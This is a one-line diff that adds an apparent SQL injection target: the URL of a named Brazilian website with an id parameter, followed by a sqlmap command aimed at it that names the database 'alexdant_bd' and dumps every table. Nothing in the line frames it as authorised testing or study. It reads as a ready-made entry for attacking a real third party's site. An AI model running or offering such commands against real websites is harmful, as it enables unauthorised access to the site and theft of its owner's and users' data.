@@ -1,0 +1,1 @@
+https://www.alexdantonio.com.br/materia.php?id=1 (GET)  # sqlmap.py -u https://www.alexdantonio.com.br/materia.php?id=1 -D alexdant_bd --tables --dump-all --threads 5 -v3
